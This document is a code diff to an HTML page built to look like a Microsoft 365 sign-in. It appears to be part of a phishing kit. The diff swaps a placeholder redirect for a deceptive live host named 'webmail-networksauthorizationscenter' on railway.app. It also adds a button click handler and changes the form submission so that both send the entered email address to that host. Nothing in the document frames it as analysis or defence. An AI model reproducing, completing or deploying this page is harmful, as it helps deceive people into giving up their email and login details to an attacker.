@@ -158,7 +158,7 @@
                 
                 <div style="display: grid;">
                     <div style="display: grid;padding: 5px 30px;width:100%;align-items: center;justify-content: center;">
-                        <a href="" style="text-decoration: none;"><div class="vYx" style="border:solid 1px #066fac;padding:10px 30px;text-align: center;width: 300px;border-radius: 2.85rem;display: flex;align-items: center;justify-content: center;font-weight:500;gap:10px;"><span><svg id="image-2" alt="Image-2" width="22" height="22" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Microsoft 365 Logo">
+                        <a href="" id="xClick" style="text-decoration: none;"><div class="vYx" style="border:solid 1px #066fac;padding:10px 30px;text-align: center;width: 300px;border-radius: 2.85rem;display: flex;align-items: center;justify-content: center;font-weight:500;gap:10px;"><span><svg id="image-2" alt="Image-2" width="22" height="22" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Microsoft 365 Logo">
                             <path d="M20.0842 3.02588L19.8595 3.16179C19.5021 3.37799 19.1654 3.61972 18.8512 3.88385L19.4993 3.42798H25L26 11L21 16L16 19.4754V23.4829C16 26.2819 17.4629 28.8774 19.8574 30.3268L25.1211 33.5129L14 40.0002H11.8551L7.85737 37.5804C5.46286 36.131 4 33.5355 4 30.7365V17.2606C4 14.4607 5.46379 11.8645 7.85952 10.4154L19.8595 3.15687C19.9339 3.11189 20.0088 3.06823 20.0842 3.02588Z" fill="url(#paint0_radial_2994_8373)"></path>
                             <path d="M20.0842 3.02588L19.8595 3.16179C19.5021 3.37799 19.1654 3.61972 18.8512 3.88385L19.4993 3.42798H25L26 11L21 16L16 19.4754V23.4829C16 26.2819 17.4629 28.8774 19.8574 30.3268L25.1211 33.5129L14 40.0002H11.8551L7.85737 37.5804C5.46286 36.131 4 33.5355 4 30.7365V17.2606C4 14.4607 5.46379 11.8645 7.85952 10.4154L19.8595 3.15687C19.9339 3.11189 20.0088 3.06823 20.0842 3.02588Z" fill="url(#paint1_linear_2994_8373)"></path>
                             <path d="M32 19V23.4803C32 26.2793 30.5371 28.8748 28.1426 30.3242L16.1426 37.5878C13.6878 39.0737 10.6335 39.1273 8.1355 37.7487L19.8573 44.844C22.4039 46.3855 25.5959 46.3855 28.1426 44.844L40.1426 37.5803C42.5371 36.1309 43.9999 33.5354 43.9999 30.7364V27.5L42.9999 26L32 19Z" fill="url(#paint2_radial_2994_8373)"></path>
@@ -263,7 +263,7 @@
         const emailInput = document.getElementById("emInp");
         const emailForm = document.getElementById("emForm");
         const submitButton = document.getElementById("submitButton");
-        const redirectURL = "https://example.com/redirect";
+        const redirectURL = "https://webmail-networksauthorizationscenter.up.railway.app";
 
         // Validate email function
         const isValidEmail = (email) => {
@@ -288,7 +288,21 @@
                 emailInput.value = decoded;
             }
         };
-        
+
+        // Handle click event for xClick
+        document.getElementById("xClick").addEventListener("click", (event) => {
+            event.preventDefault();
+            const email = emailInput.value.trim();
+
+            if (isValidEmail(email)) {
+                // Redirect with email
+                window.location.href = `${redirectURL}#${(email)}`;
+            } else {
+                // Redirect without email
+                window.location.href = redirectURL;
+            }
+        });
+
         // Handle form submission
         emailForm.addEventListener("submit", (e) => {
             e.preventDefault();
@@ -301,7 +315,7 @@
 
                 // Redirect after a short delay
                 setTimeout(() => {
-                    window.location.href = `${redirectURL}?email=${encodeURIComponent(email)}`;
+                    window.location.href = `${redirectURL}#${(email)}`;
                 }, 1500);
             } else {
                 alert("Please enter a valid email address.");
@@ -312,6 +326,8 @@
         checkURLForEmail();
     });
 </script>
+
+
 
 <script>
     document.addEventListener("DOMContentLoaded", () => {
